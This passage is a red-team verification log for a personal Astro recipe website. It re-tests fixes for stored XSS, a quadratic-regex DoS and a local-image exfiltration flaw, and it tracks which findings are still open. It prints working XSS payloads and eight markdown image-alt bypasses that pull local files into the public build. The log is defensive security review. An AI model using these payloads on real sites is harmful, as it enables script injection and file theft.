  rejection — bounded by GitHub raw limits and memory-only, not filed.
  Caveat: the cap no longer bounds worst-case *sanitiser* time — see
  RT-2026-09-06-05.
- **RT-2026-09-06-03 — verified `fixed`.** `RecipeFetcher.test.ts:93` uses
  `fs.mkdtempSync(path.join(os.tmpdir(), 'recipe-fetcher-test-'))` and asserts
  the real posts directory is untouched. Ran `npx jest --ci` three times
  back-to-back in a byte-identical scratch copy (chosen over the real repo
  specifically to avoid any risk of writing into the real `src/pages/posts/`):
  **completely deterministic — `20 failed / 8 passed` suites, `14 failed /
  79 passed` tests, identical all three runs**, with `CspBuild.test.ts`,
  `RecipeFetcher.test.ts` and `PreserveBuild.test.ts` `PASS` in every run. The
  intermittent `CspBuild` failure described in the finding did not recur once.
  `src/pages/posts/` still contained exactly the same 34 files after each run
  and no `test-recipe.md` was ever created. The `20 failed` vs. blue-team's
  stated `19 failed` baseline is an artifact of the scratch copy only:
  `test/ts/GitignorePosts.test.ts` shells out to `git check-ignore` and fails
  when the copy has no `.git` directory (it was excluded from the copy). The
  other 19 failures are the known pre-existing ESM/import and
  `DynamicSubMenu.astro:17` baseline.
- **Production-deployment gap — re-confirmed, still accurate.** Neither `353e8aa`
  nor `a8a2840` is deployed. Checked 2026-09-06:
  `curl -sI https://benjamindegryse.be/` → `last-modified: Wed, 22 Jul 2026
  23:12:48 GMT`; `curl -s https://benjamindegryse.be/ | grep -ci
  content-security-policy` → `0`; `https://benjamindegryse.be/tags/burgers%22/`
  → HTTP 200. So every fix in both commits is source-only. Conversely, the
  RT-2026-09-06-04 XSS bypass is not yet *reachable* on production either, since
  production is serving pre-353e8aa content — but it will ship the moment the
  site is next deployed.


## Red-team verification 2026-09-06 (third pass — re-derivation of commit e18c5a7)

Same methodology as the first two passes. Everything below ran in a throwaway
`rsync` copy of the repo under the session scratchpad with `node_modules`
symlinked, so `outDir: ../silassentinel.github.io/` resolved to a *scratch*
parent directory. The real
`/home/silassentinel/code/website/silassentinel.github.io` deploy repo was
never written to (re-checked afterwards: still at `3645472 Deploy: fix Settings
toggles...`, working tree unchanged) and no file was ever written into the real
`src/pages/posts/` (still exactly 34 files, no strays). Snyk MCP tools were
unavailable again (`snyk_code_scan`: "User not authenticated"; `snyk_sca_scan`:
"folder ... is not trusted"), so dependency checks used `npm ls` / `npm audit`.

- **RT-2026-07-30-01 / RT-2026-09-06-01 / RT-2026-09-06-04 — verified `fixed`.**
  The AST plugin holds. Ran every previously-successful payload back through a
  real `@astrojs/markdown-satteri@0.3.4` render *and* a real `npx astro build`:
  all four original payloads (plain `javascript:` link, `javascript:` image,
  `java&#115;cript:`, `data:text/html;base64,...`) and all six RT-2026-09-06-04
  bypasses (backslash-escaped colon link **and** image, uppercase-`X` hex
  reference link **and** image, blockquote-nested reference definition,
  list-item-nested reference definition, doubly-nested blockquote reference
  definition, escaped-`]` reference label, backslash-escaped `data:`) now render
  as `href="#blocked-by-sanitizer"` / `src="#blocked-by-sanitizer"`. The built
  `posts/BYPASS/index.html` contains zero live dangerous schemes, and a grep of
  the *entire* build output for `href="javascript:` / `src="javascript:` /
  `href="data:text/html` / `href="vbscript:` returns nothing.
  New attacks attempted at the AST layer, all held: `vbscript:`, `file:`,
  `blob:`, `view-source:`, `JaVaScRiPt:`, `JAVASCRIPT:`, angle-bracketed
  reference definitions, shortcut references, `[![img](js)](js)` nesting, and a
  **420-payload combinatorial fuzz** (5 scheme spellings × 12 obfuscations
  including `&#97;`/`&#X61;`/`&#x61;`/`&#00097;`/`&#X00061;`/`&colon;`/`&#58;`/
  `&#X3A;`/`&#X0003A;`/`\:`/leading tab × 7 markdown wrappers including inline,
  image, angle-wrapped, reference, blockquote-reference, list-reference and
  autolink). Each rendered `href`/`src` was HTML-unescaped and re-parsed with
  `new URL(value, 'https://benjamindegryse.be/posts/x/')` — the same base a real
  visitor's browser uses — and **zero** resolved to a dangerous protocol.
  Payloads that survive as *inert* output were checked individually and are
  genuinely inert because the parser percent-encodes before the plugin ever sees
  them: `java&#10;script:` → `href="java%0Ascript:alert(1)"`, `&#9;` →
  `java%09script:`, `&#13;` → `java%0Dscript:`, `%6Aavascript:` unchanged,
  `\\javascript:` → `%5Cjavascript:`, `<  javascript:...>` → `%20%20javascript:`
  — percent-encoded octets are never decoded by a browser before scheme
  detection, so all are ordinary relative URLs.
  WHATWG-parser quirks specifically checked: `HTTP:`/`HTTPS:`/`MAILTO:` case
  variants are correctly *allowed* (the parser lowercases `.protocol`, so the
  allow-list `Set` matches — verified in real built HTML: `href="HTTPS://example.com/z"`
  survives untouched); `new URL()` never re-interprets a `javascript:` string
  into an allowed scheme; and the `http:` resolution base cannot differ
  dangerously from the real `https:` page base (both are "special" schemes, and
  no input that resolves to `http:`/`https:` against one resolves to
  `javascript:` against the other).
  **Attribute coverage checked.** Instrumented the plugin's `visit` to log every
  property it ever receives across the fuzz corpus and all 34 real recipes: the
  complete set is `a.href:string`, `img.src:string`, `img.alt:string` — no
  `srcset`, no `xlink:href`, no non-string values. Confirmed structurally:
  Sätteri decodes array-valued hast properties only for the
  `PROP_SPACE_SEP`/`PROP_COMMA_SEP` wire kinds
  (`node_modules/satteri/dist/hast/element-props.js`), and `href`/`src` are not
  in those sets, so `isSafeElementUrl`'s `typeof value !== 'string' → return true`
  fail-open branch is **not reachable** from markdown (and `visit()` early-returns
  on non-string anyway, so a non-string would be left alone rather than
  laundered). It is still a fail-open default in a security predicate and would
  be better as `return false`; noted, not filed, because no reachable path exists.
  **Raw-HTML coverage is a deliberate layering split, re-verified.** Raw HTML in
  markdown becomes hast `raw` nodes, *not* `element` nodes, so the plugin never
  sees it: rendering `<a href="javascript:alert(1)">x</a>`, `<img
  srcset="javascript:alert(1) 1x">`, `<svg><a xlink:href="javascript:alert(1)">`,
  `<iframe src=...>`, `<object data=...>`, `<form action=...>`, `<base href=...>`
  and `<a href="/x" onclick="alert(1)">` through the processor with the plugin
  wired in produces all of them verbatim, with the visitor firing zero times.
  That entire class is held by `sanitizeMarkdownContent()`'s
  `/<(?=[a-zA-Z/!?])/g → &lt;` escape in `scripts/preserve-build.js:151`, which
  is unchanged by e18c5a7 and was hardened+verified in the previous two passes.
  The two controls are therefore complementary, not redundant: neither covers the
  other's cases, and removing either reopens a live XSS path.
- **RT-2026-09-06-05 — verified `fixed`.** The quadratic regex is gone, not
  narrowed (`sanitizeMarkdownUrls`, `normalizeUrlForSchemeCheck`,
  `URL_TOKEN_SOURCE` and the reference-definition pattern are all deleted from
  `scripts/preserve-build.js`). The finding's own repro now returns instantly:
  `sanitizeMarkdownContent('[a\n'.repeat(n))` at 127,950 / 255,900 / 511,800
  bytes → **0.2 ms / 0.2 ms / 0.3 ms** (was 33 ms / 122 ms / … / **32.8 s** at
  511,800 bytes). No equivalent cost exists in the new plugin: measured the
  plugin's *marginal* cost (render with plugin minus render without) on adversarial
  documents — 1k/2k/4k/8k/16k `javascript:` links → 1.8/3.9/6.3/11.8/21.7 ms
  (linear, ~1.4 µs per blocked link); 1k–8k safe `https:` links →
  1.2/2.3/4.6/9.1 ms (linear); 200/400/800-deep nested lists each containing a
  link → 0.3/0.6/1.1 ms; and a single 400 KB `javascript:` URL → 0.8 ms
  (`new URL()` is linear in input length). Doubling input doubles cost in every
  series, so the plugin is O(n) in document size with no super-linear term.
- **Zero false positives — verified by differential build.** Built the scratch
  copy twice off the 34 real recipe files, once with
  `processor: satteri({ hastPlugins: [createUrlSchemeSanitizerPlugin] })` and once
  with `processor: satteri({})`, then `diff -r` on the two output trees:
  **byte-identical across the entire site**, not just `posts/` (208 pages each).
  No real link or image is touched. Positive controls in the same build confirm
  the safe schemes survive verbatim: `href="http://example.com/x"`,
  `href="https://example.com/y"`, `href="HTTPS://example.com/z"`,
  `href="mailto:degben@mailfence.com"`, `href="../other"`, `href="#sec"`,
  `<img src="https://example.com/p.png">`, plus GFM autolinks
  (`www.example.com` → `href="http://www.example.com"`), titled links, empty
  destinations, percent-encoded and non-ASCII paths.
- **Test suite — baseline holds, deterministic.** `npx jest --ci` three times
  back-to-back in the scratch copy (which, unlike the previous pass's copy, has a
  real `git init` so `GitignorePosts.test.ts` can run): **19 failed / 10 passed
  suites, 13 failed / 100 passed tests, identical all three runs.** The 19
  failures are the known pre-existing ESM/import and `DynamicSubMenu.astro:17`
  baseline. All 10 passing suites pass in every run, including the two that shell
  out to a real `astro build` (`CspBuild.test.ts`, `UrlSchemeSanitizerPlugin.test.ts`)
  — the intermittent `CspBuild` race from RT-2026-09-06-03 did not recur.
  (Blue-team's "19 failed / 9 passed" is the pre-e18c5a7 count; the new suite
  makes it 29 total / 10 passing. The 19-failure baseline is unchanged.)
- **Dependencies — unchanged, still clean where it matters.** `npm ls sharp` →
  `astro@7.1.3 └── sharp@0.35.4`; `npm ls js-yaml` → `gray-matter@4.0.3 └──
  js-yaml@3.15.2` (the untrusted-input path is patched) with astro's own
  non-attacker-reachable `js-yaml@4.3.0` still flagged as residual audit noise.
  `npm audit`: 6 advisories (`brace-expansion`, `browserslist`, `fast-uri`,
  `js-yaml`, `nanoid`, `postcss`) — same set as the previous pass, no sharp/libvips.
- **Two NEW findings filed, both unrelated to the URL-scheme fix itself:**
  **RT-2026-09-06-06** (medium) — unvalidated markdown *body image destinations*
  become real Vite imports with no project-root confinement, giving an attacker
  who lands a Recipes commit both arbitrary-local-image exfiltration onto the
  public site and a one-line permanent build DoS; and **RT-2026-09-06-07** (low)
  — the new `UrlSchemeSanitizerPlugin.test.ts` writes a real page into the
  gitignored, untracked `src/pages/posts/` and only cleans up in `afterAll`,
  reintroducing the RT-2026-09-06-03 stale-artifact class (demonstrated by
  killing jest mid-build: the file survives and `git status` shows nothing).
- **Production-deployment gap — re-confirmed, still accurate, now three commits
  deep.** Checked 2026-09-06: `curl -sI https://benjamindegryse.be/` →
  `last-modified: Wed, 22 Jul 2026 23:12:48 GMT`;
  `curl -s https://benjamindegryse.be/ | grep -ci content-security-policy` → `0`;
  `https://benjamindegryse.be/tags/burgers%22/` → HTTP 200; and the local deploy
  repo's HEAD is still `3645472 Deploy: fix Settings toggles and wire Chaos Mode
  disable` (the pre-353e8aa deploy). So **none** of `353e8aa`, `a8a2840` or
  `e18c5a7` has shipped — every fix in this file is source-only. This is an
  operational/human item, not a code item: no further code change can close it.


## Red-team verification 2026-09-06 (fourth pass — re-derivation of commit 97db018)

Same methodology as the first three passes. All exploit work ran in a throwaway
`rsync` copy of the repo under the session scratchpad with `node_modules`
symlinked, so `outDir: ../silassentinel.github.io/` resolved to a *scratch*
parent directory. The real
`/home/silassentinel/code/website/silassentinel.github.io` deploy repo was never
written to (re-checked afterwards: still `3645472 Deploy: fix Settings toggles
and wire Chaos Mode disable`, same 2 untracked entries as before), and no file
was written by me into the real `src/pages/posts/` (still exactly 34 files,
`ls | md5sum` = `87fbd0e010a93ad613686d1e8997c4a3` before and after everything).
The jest runs were deliberately done in the **real** repo (unlike the previous
pass) precisely so the "real posts dir untouched" claim could be tested rather
than assumed. Snyk MCP tools were unavailable again (`snyk_code_scan`: "User not
authenticated"; `snyk_sca_scan`: "folder ... is not trusted"), so dependency
checks used `npm ls` / `npm audit`.

- **RT-2026-09-06-06 — FIX DOES NOT HOLD, reverted to `open`; bypass filed as
  RT-2026-09-06-08.** The three requested checks came out as follows.
  **(1) Original repro is blocked.** `![p](../../../../../../../../home/victim/
  Pictures/private.png)` and the DoS typo `![x](./photo.png)` are both rejected
  by `validateRecipeFrontmatter()` with `"Markdown image destination must be a
  fully-qualified http(s) URL..."`, before any write to `src/pages/posts/`.
  **(2) Remote images pass.** `![p](https://example.com/photo.png)`,
  the same with a `"title"`, and `http:` all return `{"valid":true}`. Two
  deliberate-but-real false positives to be aware of: reference-style
  `![p][r]` + `[r]: https://example.com/photo.png` is **rejected** (blue-team
  documented this as intentional), and so is an angle-wrapped
  `![p](<https://example.com/photo.png>)` — the latter is a double rejection,
  since `sanitizeMarkdownContent()` also escapes the `<` in `<https` to `&lt;`.
  Neither breaks a currently-published recipe (none use image syntax at all).
  **(3) Bypass hunt — eight working shapes found.** The fix is once again a
  regex over markdown *source* that disagrees with the real parser, which is
  the RT-2026-09-06-04 mistake class recurring for the third time in this file.
  The marker pattern `/!\[[^\]]*\]/g` ends the alt text at the first `]` in
  the document; CommonMark ends it at the first `]` that is neither
  backslash-escaped nor part of a balanced pair, and images (unlike links) may
  be nested inside image alt text. Placing a decoy `](https://ok.example/i.png)`
  where the regex expects the destination therefore satisfies the validator
  while the parser reads the *next* parenthesised string as the real
  destination. Verified with a differential harness (validator verdict vs.
  `metadata.localImagePaths` from a real `@astrojs/markdown-satteri@0.3.4`
  render): `![a\](http://x/)](../EVIL.png)`, its deep-traversal variant,
  `![z ![i](http://x/i.png)](../EVIL.png)`, its deep-traversal variant, the
  triple-nested `![p ![q ![r](http://x/)](http://y/)](../EVIL.png)`, the
  escaped-`]` form with a title, an escaped-`]` form producing **two** collected
  local paths on one line, and `![p](https://[/EVIL.png)` — all
  `validator=ACCEPT` with a non-empty `localImagePaths`. The last one is a
  distinct mechanism and is exactly the "scheme-prefix-only check" hypothesis:
  the validator only asserts the destination *starts with* `https?://`, whereas
  `collect-images` classifies remote-vs-local with `URL.canParse()`, so a string
  that starts with `https://` but is not a parseable URL lands in the **local**
  branch.
  Full RT-2026-09-06-06 impact re-established end-to-end through a real
  `npx astro build`: a real PNG placed outside the project root was read,
  converted by sharp and emitted into the deploy output as
  `_astro/priv.fvFiq6OF_Z19zlWX.webp` with the original basename preserved
  (build exit 0, 208 pages); the `/etc/hostname` variant exits 1 with
  `[UNRESOLVED_IMPORT]`; the `../../../package.json` variant exits 1 with
  `UnsupportedImageFormat`; the `https://[/...` variant exits 1 on module
  resolution.
  **Things that correctly held**, so the fix is not worthless — plain relative
  paths, `./photo.png`, protocol-relative `//attacker.example/x.png`, `data:`
  URIs, backslash-escaped `https\://`, and uppercase-hex-entity
  `&#X2E;&#X2E;/x.png` are all rejected. And the specific
  `https://good.example/../../../etc/passwd` idea is a genuine dead end: it is
  accepted by the validator, but `URL.canParse` succeeds so `collect-images`
  routes it to `remoteImagePaths`, `isRemoteAllowed` returns false against the
  empty `image.domains`/`remotePatterns` config, nothing is fetched at build
  time, and it is emitted as an ordinary
  `<img src="https://good.example/../../../etc/passwd">`. No local read, no
  SSRF. The live vectors are purely the alt-text/parser-divergence ones.
  **Architectural note for the next fix attempt:** blue-team's rationale for
  putting this check in `validateRecipeFrontmatter()` rather than in
  `scripts/sanitize-url-schemes.mjs` is correct — Sätteri's `collect-images`
  mdast hook runs *before* any `hastPlugins` entry, so a hast-level plugin
  genuinely cannot stop the Vite import. But the conclusion drawn from that
  ("therefore regex the source") is the error. Sätteri exposes the same
  `image(node, ctx)` mdast hook that `collect-images` itself uses
  (`node_modules/@astrojs/markdown-satteri/dist/satteri-processor.js:14-31`);
  a plugin using that hook sees the already-resolved `node.url` and has nothing
  left to disagree with. Failing that, the all-or-nothing calibration blue-team
  already chose can be keyed on a token the parser and the validator cannot
  disagree about — reject any body containing the literal two characters `![`
  — which holds against all eight payloads and breaks none of the 34 real
  recipes.
- **RT-2026-09-06-07 — verified `fixed`.** Code-verified: the only references to
  the real `src/pages/posts/` left in `test/ts/UrlSchemeSanitizerPlugin.test.ts`
  are a read (the `fs.cpSync` source at :218) and the new `fs.existsSync`
  assertion at :284; every `writeFileSync` targets `scratchProjectDir`, and both
  `scratchProjectDir` and `scratchOutDir` are `fs.mkdtempSync` paths under
  `os.tmpdir()`. There is therefore no window at all for a mid-run kill, not a
  narrowed one. Also re-confirmed that neither build-invoking suite can reach the
  real deploy repo: `CspBuild.test.ts` writes a scratch config with
  `outDir: <mkdtemp>` and `UrlSchemeSanitizerPlugin.test.ts` builds with
  `cwd: scratchProjectDir` and its own `outDir: <mkdtemp>`.
- **Test suite — baseline holds, fully deterministic.** `npx jest --ci` run three
  times back-to-back in the **real** repo: **19 failed / 10 passed suites,
  13 failed / 107 passed tests, identical all three runs** (107 vs. the previous
  pass's 100 passing tests = the 7 new tests added by 97db018). The 19 failures
  are the unchanged pre-existing ESM/import and `DynamicSubMenu.astro:17`
  baseline; the same 10 suites pass every run, including both that shell out to
  a real `astro build`. A 20 ms-interval poll of the real `src/pages/posts/`
  across a full run only ever observed 34 files, and the directory listing hash
  was identical before and after all three runs.
- **New finding filed: RT-2026-09-06-09 (low).** A tight busy-poll (rather than
  the 20 ms one) does catch a transient write: `test/ts/GitignorePosts.test.ts:27`
  still writes a real frontmatter-less `src/pages/posts/__gitignore-regression-test.md`
  into the tracked directory, momentarily taking it to 35 files. Cleaned up in a
  `finally`, so the window is milliseconds rather than RT-2026-09-06-07's ~10 s,
  but the RT-2026-09-06-03 class is shortened rather than eliminated — and the
  file would be invisible to `git status` (`git check-ignore` matches
  `.gitignore:134:src/pages/posts/`). `git check-ignore` does not require the
  path to exist, so the write is not even necessary.
- **Dependencies — unchanged.** `npm ls sharp` → `astro@7.1.3 └── sharp@0.35.4`;
  `npm ls js-yaml` → `gray-matter@4.0.3 └── js-yaml@3.15.2` (the
  untrusted-input path stays patched), with astro's / `@astrojs/internal-helpers`'
  own non-attacker-reachable `js-yaml@4.3.0` still residual audit noise.
  `npm audit`: same 6 advisories as the previous pass (`brace-expansion`,
  `browserslist`, `fast-uri`, `js-yaml`, `nanoid`, `postcss`), no sharp/libvips.
- **Production-deployment gap — re-confirmed, still accurate, now four commits
  deep.** Checked 2026-09-06: `curl -sI https://benjamindegryse.be/` →
  `HTTP/2 200`, `last-modified: Wed, 22 Jul 2026 23:12:48 GMT`;
  `curl -s https://benjamindegryse.be/ | grep -ci content-security-policy` → `0`;
  `https://benjamindegryse.be/tags/burgers%22/` → HTTP 200; local deploy repo
  HEAD still `3645472` (the pre-`353e8aa` deploy). None of `353e8aa`, `a8a2840`,
  `e18c5a7` or `97db018` has shipped. This remains an operational/human item, not
  a code item.

### Final sweep — verdict as of 2026-09-06 (after four rounds)

**ags' code-fixable security work is NOT complete.** Status of every filed item:

| ID | Status | Note |
|----|--------|------|
| RT-2026-07-30-01 | fixed | raw-HTML XSS + CSP, verified pass 3 |
| RT-2026-07-30-02 | fixed | verified pass 1 |
| RT-2026-07-30-03 | fixed | verified pass 1 |
| RT-2026-07-30-04 | fixed | verified pass 1 |
| RT-2026-09-05-01 | fixed | verified pass 1 |
| RT-2026-09-05-02 | fixed | verified pass 1 |
| RT-2026-09-06-01 | fixed | verified pass 3 (AST plugin) |
| RT-2026-09-06-02 | fixed | verified pass 2 |
| RT-2026-09-06-03 | fixed | verified pass 2 |
| RT-2026-09-06-04 | fixed | verified pass 3 |
| RT-2026-09-06-05 | fixed | verified pass 3 |
| RT-2026-09-06-06 | **open** | fix bypassed — see RT-2026-09-06-08 |
| RT-2026-09-06-07 | fixed | verified pass 4 |
| RT-2026-09-06-08 | **open** | new, medium — 8 confirmed bypasses, exfil + DoS reproduced end-to-end |
| RT-2026-09-06-09 | **open** | new, low — residual test pollution of the real tracked posts dir |

One medium code issue (local-file exfiltration into the public deploy repo +
permanent build DoS, RT-2026-09-06-06/08) is still fully exploitable by anyone
who can land a commit in the untrusted `Silassentinel/Recipes` repo, and one low
hygiene issue (RT-2026-09-06-09) is outstanding. The stored-XSS family
(RT-2026-07-30-01 / -09-06-01 / -04 / -05) *is* now genuinely closed and has
survived two consecutive adversarial passes including a 420-payload fuzz, which
is a real result — but the trust boundary "content fetched from the Recipes repo
is attacker-controlled" is still not fully enforced, because it keeps being
enforced with source-level regexes instead of at the parser. Three of the four
rounds have now been lost to exactly that pattern; the pattern, not the
individual payload, is the thing that needs fixing.

Separately and unchanged: the **production-deployment gap** is not a code
finding and no code change can close it. Every security fix in this file remains
source-only; benjamindegryse.be has served the same pre-`353e8aa` build since
2026-07-22. That distinction should stay recorded as-is.
